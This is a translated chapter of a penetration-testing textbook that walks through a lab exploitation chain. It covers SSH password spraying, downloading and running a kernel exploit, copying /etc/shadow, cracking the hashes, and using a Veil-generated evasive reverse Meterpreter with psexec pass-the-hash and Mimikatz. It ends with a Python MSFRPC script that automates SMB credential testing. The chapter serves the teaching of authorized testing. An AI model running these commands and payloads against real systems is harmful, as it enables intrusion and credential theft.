即使一个组织有一个薄弱的安全策略，如果它雇佣了高技能的工程师和管理员，它可能仍然拥有一个相当强大的战术安全姿态。在战术层面上，非常聪明的技术人员意味着可以制定强有力的控制措施，但如果没有一个全面的安全策略，设备可能会被忽视，相关强大的技术姿态中可能存在漏洞。另一个风险是当这些技能成员离开组织，或者更糟糕的是，如果他们变得叛逆。

无论如何，如果没有建立的流程和程序，任何强大的安全控制在那一点都可能被认为已经受到了损害。此外，全面和验证的控制实施可能是不可能的。作为渗透测试人员，这对你来说很重要，因为你可以理解组织信息安全计划的起伏和流动以及常见原因。管理层将寻求你对这些问题的答案，你所看到的指标将帮助你诊断问题并确定根本原因。

# 理解服务利用的新时代。

在之前的章节中，已经做好了准备，向你展示了一个新时代利用的模拟示例。这意味着，我们正在利用配置错误、默认设置、不良实践和安全意识的缺乏。与其在开发的代码中找到控制差距，不如在环境中包括人员培训的实施中找到。进入或穿越网络的特定方式将取决于网络，攻击向量会发生变化，而不是记住特定的向量，要专注于建立一种思维方式。

今天的利用意味着识别已经存在的访问权限，并窃取该访问权限的一部分，通过该访问级别来妥协系统，捕获这些系统的详细信息，并横向移动，直到识别出关键数据或新的访问级别。一旦你确定了对系统的访问权限，你将尝试查找允许你移动和访问其他系统的详细信息。这意味着配置文件中包含用户名和密码、存储的用户名和密码，或者挂载的共享文件。这些组件中的每一个都将为您提供信息，以获取对其他主机的访问权限。以这种方式攻击系统的好处在于它比利用 RCE 和上传有效载荷要安静得多；你在必要协议的范围内移动，并且你更好地模拟了真正的恶意行为者。

为了建立一种一致的语言，你从一个主机移动到另一个主机，以相同的特权级别，这被称为横向移动。当你找到更高级别的特权，比如**域管理员（DA）**，这被认为是垂直移动或特权升级。当你利用对主机或网络区域的访问权限来获取以前无法看到的系统的访问权限，因为访问控制或网络隔离，这被称为枢纽。现在你理解了这些概念和术语，让我们来弹出一些框。

### 提示

为了模拟这个例子，我们将使用 Windows XP 模式和 Metasploitable 的组合，这两者都是免费使用的。有关设置 Metasploitable 的详细信息已经提供。Windows XP 模式的详细信息可以在以下两个**统一资源定位符**（**URL**）中找到[`zeltser.com/windows-xp-mode-for-vmware-virtualization/`](https://zeltser.com/windows-xp-mode-for-vmware-virtualization/)和[`zeltser.com/how-to-get-a-windows-xp-mode-virtual-machine-on-windows/`](https://zeltser.com/how-to-get-a-windows-xp-mode-virtual-machine-on-windows/)。记住要执行 Windows 机器可能有的尽可能多的这些漏洞，以启用其管理共享。在真实的域中，这是很常见的，因为它们经常用于管理远程系统。

# 理解利用的链接

在第四章中，*用 Python 执行凭据攻击*，我们展示了如何在系统或环境中识别合法帐户。Metasploitable 有很好的文档，但是获取对系统的访问权限的概念与现实生活中是相同的。此外，像这样的易受攻击的框提供了一个很棒的培训环境，对你来说，从可用性和法律角度来看，风险很小。在上一章中，我们验证了目标系统上存在`msfadmin`帐户，并且在 Metasploitable 中，默认情况下，该帐户的密码与用户名相同。

就像真实环境一样，我们通过网站和配置渠道进行研究，以确定默认帐户和设置是什么，然后使用这些信息智能地利用这些框。为了验证这些弱点，我们将执行密码喷洒攻击。这种攻击使用一个密码对应多个用户名，这可以防止帐户锁定。它依赖于环境中密码重用的原则，或者用户在所在地区常用的密码。

### 注意

在美国，你会发现最常用的密码是 Password1、Password123，以及季节和年份，比如 Summer2015，还有一些与公司名称或测试的用户名有关的密码。直到今天，我在每次参与的项目中都发现了某种形式的弱密码或默认密码。如果你观看或阅读任何一次重大的数据泄露，你会发现弱密码、默认密码或已知密码是其中的一个组成部分。另外，请注意，所有这些密码都符合 Windows Active Directory 密码复杂性要求，如[`technet.microsoft.com/en-us/library/hh994562%28v=ws.10%29.aspx`](https://technet.microsoft.com/en-us/library/hh994562%28v=ws.10%29.aspx)所示。

## 检查弱密码、默认密码或已知密码

使用已知用户名`msfadmin`执行对 Metasploitable 的密码喷洒攻击，使用与用户名相同的密码。我们扫描目标主机以查找我们可以测试凭据的开放服务。

![检查弱密码、默认密码或已知密码](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_01.jpg)

然后我们可以注意到**Secure Shell** (**SSH**)服务是开放的，因此这将是一个很好的目标服务。攻击这项服务将提供对主机的交互式访问。例如，我们可以对 SSH 服务启动 Hydra，以测试目标主机上的这个特定弱点。如下图所示，我们已经验证了提供对系统访问权限的用户名和密码组合。

![检查弱密码、默认密码或已知密码](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_02.jpg)

现在，许多新的评估者可能会只使用 Metasploit 来执行这个攻击训练，如第三章所示，*物理引擎集成*。问题在于，你无法与服务进行交互，而是必须通过命令行而不是终端访问。为了绕过这个限制，我们将使用 SSH 客户端。

### 注意

命令行不允许使用交互式命令，而终端可以。通过 SSH 客户端利用 SSH 服务提供终端访问，而 Metasploit 模块`ssh_login`提供命令行访问。因此，在可能的情况下，终端是首选的，如下例所示。

## 获取系统的 root 访问权限

现在我们知道了访问该系统的用户名和密码组合，我们可以尝试访问主机并识别系统上的其他细节。具体来说，我们想要识别可能为我们提供访问其他系统的其他用户名和密码。为了做到这一点，我们需要查看是否可以访问目标主机上的`/etc/passwd`和`/etc/shadow`文件。这两个文件的组合将提供主机上的用户名和相关密码。使用用户名和密码`msfadmin`通过 SSH 登录系统。

![获取系统的 root 访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_03.jpg)

现在，我们验证我们是否可以访问`/etc/passwd`文件，然后使用**Secure Copy** (**SCP**)将文件复制到我们的 Kali 主机上。以下成功的复制显示我们已经访问了该文件：

获取系统的 root 访问权限

然后，我们尝试使用当前访问权限访问`/etc/shadow`，并确定这是不可能的。

![获取系统的 root 访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_05.jpg)

这意味着我们需要提升本地权限以访问该文件；在 Linux 中，可以通过四种主要方式之一来实现。最简单的方法是找到主机上存储的用户名和密码，这在 Linux 或 UNIX 服务器上非常常见。第二种方法，不需要引入漏洞到系统中，是通过操纵文件、输入和输出，这些文件、输入和输出使用了 Sticky 位、**Set User Identifier** (**SUID**)和**Globally Unique Identifier** (**GUID**)的不当用法。第三种方法是利用内核的一个易受攻击的版本。

第四种方法是获得对这些文件的访问权限最容易被忽视的方式，即通过`misconfigured sudo`访问。您只需执行`sudo su -`，这将实例化一个作为 root 的会话。以下显示了这是一个简单获得系统根访问权限的例子：

![获得系统的根访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_06.jpg)

### 提示

从技术上讲，还有第五种方法，但这意味着利用可能直接提供根访问权限的不同服务。这在 Metasploitable 中可用，但在真实环境中不太常见。

现在请记住，此时我们可以轻松地获取这两个文件并将它们复制出来。为了提供一个更真实的例子，我们将突出显示对内核的利用研究验证和执行。因此，我们需要验证系统上的内核版本，并使用命令`uname -a`来查看它是否容易受到攻击。

![获得系统的根访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_07.jpg)

系统正在运行内核版本 2.6.24，这是过时的并且已知容易受到攻击。这可以在许多地方进行研究，包括最受欢迎的[`www.cvedetails.com/`](http://www.cvedetails.com/)之一，它不仅引用漏洞，还指出可以找到利用程序的位置。

### 提示

永远不要从互联网上下载利用程序并直接在系统上利用它。相反，始终在实验室环境中进行测试，在一个与任何其他系统或设备都没有连接的隔离系统上进行测试。在测试时，确保运行网络监听和其他监控工具，以验证可能在后台运行的活动。

从**Gotogle**页面，您可以直接搜索漏洞。

![获得系统的根访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_08.jpg)

结果是这个内核有大量的漏洞。我们正在寻找一个特定的漏洞，它将允许我们使用已知的利用程序进行特权升级。因此，我们导航到**漏洞（324）**下找到的列出的漏洞，这代表了在撰写本书时发现的特定内核版本的漏洞数量。

![获得系统的根访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_09.jpg)

我们按**Exploits 数量降序**组织漏洞，以找到可利用的漏洞。

![获得系统的根访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_10.jpg)

然后，我们寻找每个在“# of Exploits”列中有红色数字和在**Vulnerability Types**列中有**+Priv**的漏洞，以识别有用的利用程序。这表示公开可用的利用程序数量，以及在这种情况下利用漏洞会返回什么，即提升的权限。

![获得系统的根访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_11.jpg)

CVE-2010-1146 是一个非常好的候选项，如下例所示。现在可以在[`www.exploit-db.com/exploits/12130`](http://www.exploit-db.com/exploits/12130)找到一个公开可用的利用程序，由[`www.cvedetails.com/`](http://www.cvedetails.com/)引用。

![获得系统的根访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_12.jpg)

现在，在您下载利用程序并运行之前，您应该检查并查看系统是否甚至容易受到此利用程序的攻击。基本要求是挂载了**Reiser 文件系统**（**ReiserFS**）并带有**扩展属性**（**xattr**）。因此，我们需要使用内置命令的组合来检查并查看我们的 Metasploitable 实例中是否有 ReiserFS xattr。首先，我们需要使用`fdisk -l`来识别分区，然后使用`df -T`来识别文件系统类型，然后必要时可以查看每个 ReiserFS 分区。`fdisk -l`的任何输出，带有标识符 83 的都有可能是 ReiserFS 挂载的候选项。

![获得系统的根访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_13.jpg)

如上所示，设备`/dev/sda1`的标识符为 83，因此该挂载点有可能是 ReiserFS；可以使用`df -T`来验证。运行命令后，我们看到该设备是一个 EXT3 文件系统，这意味着它不是 ReiserFS，因此我们不需要检查文件系统是否启用了扩展属性。

### 提示

您还可以检查`/etc/fstab`，看看分区是否已正确定义为 xattr 和 reiserfs。请记住，这不会检测系统上潜在的手动挂载，因此可能会错过攻击向量。但请记住，`/etc/fstab`中可能还包含明文凭据，或者包含凭据的挂载文件的引用。因此，这仍然是一个检查允许您继续前进的项目的好地方。

![获得系统的 root 访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_14.jpg)

因此，内核在理论上对这种 exploit 是有漏洞的，但是该主机的当前配置对特定的 exploit 不易受攻击。现在我们知道，即使在执行之前，这种特定的特权利用也不会起作用。这意味着，我们需要回到[`www.cvedetails.com/`](http://www.cvedetails.com/)，并尝试识别其他可行的 exploit。一个潜在的可行漏洞涉及 CVE-2009-1185，有一个在 milw0rm 上的 exploit。

![获得系统的 root 访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_15.jpg)

### 注意

任何指向[`www.milw0rm.com`](http://www.milw0rm.com)的 exploit 的引用现在位于[`www.exploit-db.com/`](http://www.exploit-db.com/)。当 Offensive Security 团队接管`milw0rm`数据库时，`milw0rm`数据库被移动到`exploit-db`。因此，只需调整相关的 URL，您将找到相同的详细信息。

现在您可以从网站下载 exploit 并将其传输到系统，或者我们可以通过命令行作弊并完成它。只需运行以下命令：

```py
wget http://www.exploit-db.com/download/8572 -O escalate.c

```

这将下载 exploit 并将其保存为`code`，以便在本地主机上编译和执行。

![获得系统的 root 访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_16.jpg)

我们需要找到`gcc`编译器，并验证它是否在我们的路径中，以便轻松执行，然后在目标系统上编译代码。可以按照以下步骤完成，使用`gcc`和以下命令将代码编译为 exploit：`gcc escalate.c -o escalate`。这将输出名为`escalate`的新可执行二进制文件。

### 提示

在真实系统上执行时，不要将文件命名为`exploit`、`escalate`、`shell`、`pwned`或类似的名称。这些是许多安全工具扫描的常见名称，因此它们在执行之前可能会被标记。对于本例来说，这并不重要。

现在编译的 exploit 被称为`escalate`，一旦我们确定了一些其他信息组件，就可以运行。这个 exploit 利用了 udevd netlink 套接字进程，因此我们需要识别该进程并将 exploit 传递给**进程标识符**（**PID**）。这可以在引用服务`/proc/net/netlink`的文件中找到。您可以通过执行以下命令来识别详细信息：`cat /proc/net/netlink`。

![获得系统的 root 访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_17.jpg)

### 注意

请记住，您的 PID 可能会有所不同。

这个 exploit 特别执行一个包含命令的脚本，写入文件`/tmp/run`。因此，让我们将`/etc/shadow`文件复制到`/tmp`，因为我们首先要访问的就是这些数据。我们还需要验证复制的文件是否与原始文件相同；我们可以通过对每个文件进行**消息摘要 5**（**MD5**）并将结果放入`/tmp`中的另一个文件`hashes`来轻松地完成这一点。在`/tmp`中创建一个名为 run 的文件，并添加以下内容：

```py
#!/bin/bash
cp /etc/shadow /tmp/shadow
chmod 777 /tmp/shadow
md5sum /tmp/shadow > /tmp/hashes
md5sum /etc/shadow >> /tmp/hashes

```

然后，使用特定进程的参数运行漏洞利用。下图显示了`gcc`编译器的识别、漏洞利用的编译、执行和结果的证明：

![获取系统的 root 访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_18.jpg)

### 注意

可以直接卸载文件，而不是移动和复制它，但通常情况下，你不会将系统的用户名和密码写入被利用的盒子上的文件，因为你永远不知道谁已经在上面。此外，这个例子是设计为简单的端口重定向工具，如`netcat`可能不在系统上。

然后，通过比较两个文件的 MD5 哈希值，并将其写入`/tmp/hashes`文件，验证复制文件的内容与`/etc/shadow`文件相同。然后可以将新复制的文件从系统上复制到攻击盒上。

### 提示

在真实环境中一定要非常谨慎，当你复制`passwd`或 shadow 文件时，可能会破坏目标系统。因此，请确保不要删除、重命名或移动原始文件。如果在目标系统的其他位置复制了文件，请删除它，以免帮助真正的攻击者。

同时，记住内核漏洞利用有三种输出，它们可能每次执行时都不起作用（所以再试一次），它们可能会使特定主机崩溃，或者提供所需的结果。如果你执行这些类型的攻击，一定要在执行之前与客户一起工作，以确保它不是关键系统。简单的重启通常可以解决崩溃问题，但这些类型的攻击总是比在服务器上执行更安全。

![获取系统的 root 访问权限](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_19.jpg)

## 理解 Linux 哈希破解

现在，在 Kali 盒上创建一个目录来处理所有破解数据，并将 shadow 和`passwd`文件移动过去。

![理解 Linux 哈希破解](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_20.jpg)

然后，使用 John 来使用`unshadow`命令组合文件，然后开始默认的破解尝试。

![理解 Linux 哈希破解](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_21.jpg)

## 测试账户凭据的同步

有了这些结果，我们可以确定这些凭据是否在网络中被重用。我们知道目标网络中主要是 Windows 主机，但我们需要确定哪些主机开放了端口`445`。然后我们可以尝试确定，当运行以下命令时，哪些帐户可能授予我们访问权限：

```py
nmap -sS -vvv -p445 192.168.195.0/24 -oG output

```

然后，使用以下命令解析开放端口的结果，这将提供一个启用**Server Message Block (SMB)**的目标主机文件。

```py
grep 445/open output| cut -d" " -f2 >> smb_hosts

```

密码可以直接从 John 中提取，并写成一个密码文件，用于后续的服务攻击。

```py
john --show unshadowed |cut -d: -f2|grep -v " " > passwords

```

### 提示

第一次运行这种类型的攻击时，一定要在单个主机上进行测试。在这个例子中，我们使用了 sys 帐户，但更常见的是使用 root 帐户或类似的管理帐户来测试密码重用（同步）在一个环境中。

使用`auxiliary/scanner/smb/smb_enumusers_domain`进行的以下攻击将检查两件事。它将确定此帐户可以访问哪些系统，以及当前登录到系统的相关用户。在此示例的第二部分中，我们将重点介绍如何识别实际特权帐户和域的一部分。

`smb_enumusers_domain`模块有好坏之分。坏的一面是您无法将多个用户名和密码加载到其中。这种能力是为`smb_login`模块保留的。`smb_login`的问题在于它非常嘈杂，因为许多签名检测工具会对这种测试登录的方法进行标记。第三个模块`smb_enumusers`可以使用，但它只提供与本地用户相关的详细信息，因为它根据安全账户管理器（SAM）文件内容识别用户。因此，如果用户有域账户并且已登录到该系统，`smb_enumusers`模块将无法识别他们。

因此，在确定横向移动的目标时，要了解每个模块及其限制。我们将重点介绍如何配置`smb_enumusers_domain`模块并执行它。这将展示一个获得对易受攻击主机访问权限的示例，然后验证 DA 账户成员资格。然后可以使用这些信息来确定 DA 的位置，以便使用 Mimikatz 提取凭据。

### 注意

对于这个例子，我们将使用 Veil 作为自定义利用程序，尝试绕过主机入侵防护系统（HIPS）。有关 Veil 的更多信息可以在[`github.com/Veil-Framework/Veil-Evasion.git`](https://github.com/Veil-Framework/Veil-Evasion.git)找到。

因此，我们配置模块使用密码`batman`，并且目标是系统上的本地管理员账户。这可以更改，但通常使用默认值。由于它是本地管理员，域设置为`WORKGROUP`。下图显示了模块的配置：

![测试账户凭据同步](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_22.jpg)

### 注意

在运行这些命令之前，请确保使用 spool 将结果输出到日志文件中，以便您可以返回并查看结果。

正如您在下图中所看到的，该账户提供了有关谁登录到系统的详细信息。这意味着返回的账户名称中有相关的已登录用户，并且本地管理员账户将在该系统上起作用。这意味着这个系统很容易受到“传递哈希攻击”（PtH）的威胁。

![测试账户凭据同步](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_23.jpg)

### 注意

`psexec`模块允许您传递提取的本地区域网络管理器（LM）：新技术 LM（NTLM）哈希和用户名组合，或者只是用户名密码对来获取访问权限。

首先，我们设置一个自定义的 multi/handler 来捕获 Veil 生成的自定义利用程序，如下例所示。请记住，我使用`443`作为本地端口，因为它可以绕过大多数 HIPS，而本地主机将根据您的主机而变化。

![测试账户凭据同步](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_24.jpg)

现在，我们需要使用 Veil 生成自定义有效载荷，以便与`psexec`模块一起使用。您可以通过导航到`Veil-Evasion`安装目录并使用`python Veil-Evasion.py`来执行此操作。Veil 有许多有效载荷，可以使用各种混淆或保护机制生成，要查看要使用的特定有效载荷，执行`list`命令。您可以通过输入有效载荷的编号或名称来选择有效载荷。例如，运行以下命令生成一个不使用 shell 代码的 C#分段器，但请记住，这需要目标计算机上特定版本的.NET 才能工作。

```py
use cs/meterpreter/rev_tcp
set LPORT 443
set LHOST 192.168.195.160
set use_arya Y
generate

```

### 注意

典型有效载荷有两个组成部分，分别是分段器和阶段。分段器在攻击者和受害者之间建立网络连接。通常使用本地系统语言的有效载荷可以是纯粹的分段器。第二部分是阶段，这些是由分段器下载的组件。这些可以包括像 Meterpreter 这样的东西。如果两个项目结合在一起，它们被称为单个；想想当你创建你的恶意**通用串行总线**（**USB**）驱动器时，这些通常是单个。

输出将是一个可执行文件，将生成一个加密的反向**超文本传输安全协议（HTTPS）** Meterpreter。

![测试帐户凭据的同步](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_25.jpg)

有效载荷可以使用脚本`checkvt`进行测试，该脚本可以安全地验证有效载荷是否会被大多数 HIPS 解决方案拾取。它可以在不上传到 Virus Total 的情况下进行此操作，也不会将有效载荷添加到数据库中，许多 HIPS 提供商都会从中提取。相反，它会将有效载荷的哈希与数据库中已有的哈希进行比较。

![测试帐户凭据的同步](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_26.jpg)

现在，我们可以设置`psexec`模块以引用自定义有效载荷进行执行。

![测试帐户凭据的同步](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_27.jpg)

更新`psexec`模块，使其使用由`Veil-Evasion`生成的自定义有效载荷，通过设置`EXE::Custom`并使用`set DisablePayloadHandler true`禁用自动有效载荷处理程序，如下所示：

![测试帐户凭据的同步](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_28.jpg)

利用目标机器，然后尝试确定域中的 DA 是谁。这可以通过两种方式之一完成，即使用`post/windows/gather/enum_domain_group_users`模块或通过 shell 访问使用以下命令：

```py
net group "Domain Admins"

```

然后，我们可以通过先前运行的模块的输出文件进行`Grep`，以定位可能已登录这些 DA 的相关系统。当访问这些系统中的一个时，内存中可能会有 DA 令牌或凭据，这些可以被提取和重复使用。以下命令是分析这些类型条目的日志文件的示例：

```py
grep <username> <spoofile.log>

```

正如您所看到的，这条非常简单的利用路径可以让您确定 DA 的位置。一旦您进入系统，您只需`load mimikatz`并从已建立的 Meterpreter 会话中使用`wdigest`命令提取凭据。当然，这意味着系统必须比 Windows 2000 更新，并且在内存中有活动凭据。如果没有，将需要额外的努力和研究来继续前进。为了强调这一点，我们使用我们已建立的会话来提取凭据，如下例所示。凭据在内存中，由于目标机器是 Windows XP，所以没有冲突，也不需要额外的研究。

![测试帐户凭据的同步](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_29.jpg)

除了从系统中提取活动 DA 列表所获得的情报外，我们现在还有另一组确认的凭据可供使用。重复使用这种攻击方法可以让您快速在网络中移动，直到找到可行的目标。

# 使用 Python 自动化利用列车

这个利用火车相对简单，但我们可以使用**Metasploit 远程过程调用**（**MSFRPC**）自动化部分内容。此脚本将使用`nmap`库扫描端口`445`的活动端口，然后生成一个目标列表，以便使用通过参数传递给脚本的用户名和密码进行测试。脚本将使用相同的`smb_enumusers_domain`模块来识别具有重复凭据和其他可用用户登录的框。首先，我们需要安装 Python 的`SpiderLabs msfrpc`库。这个库可以在[`github.com/SpiderLabs/msfrpc.git`](https://github.com/SpiderLabs/msfrpc.git)找到。

### 注意

书中的 GitHub 存储库可以在[`github.com/funkandwagnalls/pythonpentest`](https://github.com/funkandwagnalls/pythonpentest)找到，并且其中有一个设置文件，可以运行以安装所有必要的软件包、库和资源。

我们正在创建的脚本使用`netifaces`库来识别哪个接口 IP 地址属于您的主机。然后，它扫描端口`445`，即 IP 地址、范围或**类间域路由**（**CIDR**）地址上的 SMB 端口。它消除了属于您接口的任何 IP 地址，然后使用 Metasploit 模块`auxiliary/scanner/smb/smb_enumusers_domain`来测试凭据。同时，它验证了系统上登录的用户。除了实时响应之外，此脚本的输出还包括两个文件，一个包含所有响应的日志文件，以及一个保存具有 SMB 服务的所有主机的 IP 地址的文件。

### 提示

这个 Metasploit 模块利用了 RPCDCE，它不在端口`445`上运行，但我们正在验证该服务是否可用以进行后续利用。

![用 Python 自动化利用火车](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_30.jpg)

然后，如果作为攻击者发现其他凭据集进行测试，可以将此文件馈送回脚本，如下所示：

![用 Python 自动化利用火车](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_05_31.jpg)

最后，脚本可以直接传递哈希，就像 Metasploit 模块中所示的那样：

自动化利用 Python 的利用火车

### 注意

每次运行脚本时，输出都会略有不同，这取决于你获取的控制台标识符来执行命令。唯一的真正区别将是与 Metasploit 控制台启动典型的附加横幅项目。

现在有几件事情必须说明，是的，你可以只生成一个资源文件，但是当你开始涉及拥有数百万个 IP 地址的组织时，这变得难以管理。此外，MSFRPC 也可以直接将资源文件馈送到其中，但这可能会显著减慢过程。如果你想进行比较，请重写此脚本，以执行与你之前编写的`ssh_login.py`脚本相同的测试，但直接集成 MSFRPC。

### 注意

未来书中最重要的事项是，许多未来的脚本将非常庞大，并具有额外的错误检查。由于你的技能是从零开始建立的，已经说明的概念将不会被重复。相反，整个脚本可以从 GitHub 下载，以识别脚本的细微差别。此脚本确实使用了`ssh_login.py`脚本中使用的先前的`netifaces`函数，但出于简洁起见，我们不会在本章中复制它。你可以在这里下载完整的脚本[`raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/msfrpc_smb.py`](https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/msfrpc_smb.py)。

就像所有脚本一样，需要建立库，其中大部分你已经熟悉，最新的一个与 MSFRPC 相关的库是由`SpiderLabs`提供的。此脚本所需的库如下所示：

```py
import os, argparse, sys, time
try:
    import msfrpc
except:
    sys.exit("[!] Install the msfrpc library that can be found 
      here: https://github.com/SpiderLabs/msfrpc.git")
try:
    import nmap
except:
    sys.exit("[!] Install the nmap library: pip install python-nmap")
try:
    import netifaces
except:
    sys.exit("[!] Install the netifaces 
      library: pip install netifaces")
```

然后，我们构建一个模块，以识别将针对其运行辅助模块的相关目标。首先，我们设置构造函数和传递的参数。请注意，对于此脚本，我们有两个要测试的服务名称，`microsoft-ds`和`netbios-ssn`，因为根据`nmap`的结果，任何一个都可能代表端口 445。

```py
def target_identifier(verbose, dir, user, passwd, ips, port_num, ifaces, ipfile):
    hostlist = []
    pre_pend = "smb"
    service_name = "microsoft-ds"
    service_name2 = "netbios-ssn"
    protocol = "tcp"
    port_state = "open"
    bufsize = 0
    hosts_output = "%s/%s_hosts" % (dir, pre_pend)
```

之后，我们配置 nmap 扫描程序以通过文件或命令行扫描详细信息。请注意，`hostlist`是由文件加载的所有地址的字符串，并且它们用空格分隔。打开并读取`ipfile`，然后将所有新行替换为空格，因为它们被加载到字符串中。这是 nmap 库的特定`hosts`参数的要求。

```py
    if ipfile != None:
  if verbose > 0:
print("[*] Scanning for hosts from file %s") % (ipfile)
        with open(ipfile) as f:
            hostlist = f.read().replace('\n',' ')
        scanner.scan(hosts=hostlist, ports=port_num)
    else:
  if verbose > 0:
        print("[*] Scanning for host\(s\) %s") % (ips)
        scanner.scan(ips, port_num)
    open(hosts_output, 'w').close()
    hostlist=[]
    if scanner.all_hosts():
        e = open(hosts_output, 'a', bufsize)
    else:
        sys.exit("[!] No viable targets were found!") 
```

攻击系统上所有接口的 IP 地址都从测试池中删除。

```py
    for host in scanner.all_hosts():
        for k,v in ifaces.iteritems():
            if v['addr'] == host:
                print("[-] Removing %s from target list since it 
                    belongs to your interface!") % (host)
                host = None 
```

最后，详细信息被写入相关的输出文件和 Python 列表，然后返回到原始调用来源。

```py
        if host != None:
            e = open(hosts_output, 'a', bufsize)
            if service_name or service_name2 in 
              scanner[host][protocol][int(port_num)]['name']:
                if port_state in 
                    scanner[host][protocol][int(port_num)]['state']:
                    if verbose > 0:
                        print("[+] Adding host %s to %s since the service 
                            is active on %s") % (host, hosts_output, port_num)
                    hostdata=host + "\n"
                    e.write(hostdata)
                    hostlist.append(host)
    else:
        if verbose > 0:
               print("[-] Host %s is not being added to %s since the 
                   service is not active on %s") % 
                       (host, hosts_output, port_num)
    if not scanner.all_hosts():
        e.closed
    if hosts_output:
        return hosts_output, hostlist 
```

接下来的函数创建将要执行的实际命令；对于扫描返回的每个主机，将调用此函数作为潜在目标。

```py
def build_command(verbose, user, passwd, dom, port, ip):
    module = "auxiliary/scanner/smb/smb_enumusers_domain"
    command = '''use ''' + module + '''
set RHOSTS ''' + ip + '''
set SMBUser ''' + user + '''
set SMBPass ''' + passwd + '''
set SMBDomain ''' + dom +'''
run
'''
    return command, module
```

最后的函数实际上启动了与 MSFRPC 的连接，并针对特定主机执行相关命令。

```py
def run_commands(verbose, iplist, user, passwd, dom, port, file):
    bufsize = 0
    e = open(file, 'a', bufsize)
    done = False
```

脚本与 MSFRPC 建立连接，然后创建控制台，然后通过特定的`console_id`跟踪它。不要忘记，`msfconsole`可以有多个会话，因此我们必须将我们的会话跟踪到`console_id`。

```py
    client = msfrpc.Msfrpc({})
    client.login('msf','msfrpcpassword')
    try:
        result = client.call('console.create')
    except:
        sys.exit("[!] Creation of console failed!")
    console_id = result['id']
    console_id_int = int(console_id)
```

然后，脚本遍历了已确认具有活动 SMB 服务的 IP 地址列表。然后，脚本为每个 IP 地址创建了必要的命令。

```py
    for ip in iplist:
        if verbose > 0:
            print("[*] Building custom command for: %s") % (str(ip))
        command, module = build_command(verbose, user, 
          passwd, dom, port, ip)
        if verbose > 0:
            print("[*] Executing Metasploit module %s 
              on host: %s") % (module, str(ip)) 
```

然后将命令写入控制台，并等待结果。

```py
        client.call('console.write',[console_id, command])
        time.sleep(1)
        while done != True:
```

我们等待每个命令执行的结果，并验证返回的数据以及控制台是否仍在运行。如果是，我们延迟读取数据。一旦完成，结果将被写入指定的输出文件。

```py
            result = client.call('console.read',[console_id_int])
            if len(result['data']) > 1:
                if result['busy'] == True:
                    time.sleep(1)
                    continue
                else:
                    console_output = result['data']
                    e.write(console_output)
                    if verbose > 0:
                        print(console_output)
                    done = True
```

我们关闭文件并销毁控制台，以清理我们所做的工作。

```py
    e.closed
    client.call('console.destroy',[console_id])
```

脚本的最后部分涉及设置参数、设置构造函数和调用模块。这些组件与以前的脚本类似，这里没有包括，但详细信息可以在 GitHub 上的先前提到的位置找到。最后的要求是在`msfconsole`中加载`msgrpc`，并使用我们想要的特定密码。因此，启动`msfconsole`，然后在其中执行以下操作：

```py
load msgrpc Pass=msfrpcpassword
```

### 注意

命令没有输入错误，Metasploit 已经转移到`msgrpc`而不是`msfrpc`，但每个人仍然称其为`msfrpc`。最大的区别是`msgrpc`库使用 POST 请求发送数据，而`msfrpc`使用**可扩展标记语言**（**XML**）。所有这些都可以通过资源文件自动化设置服务。

# 总结

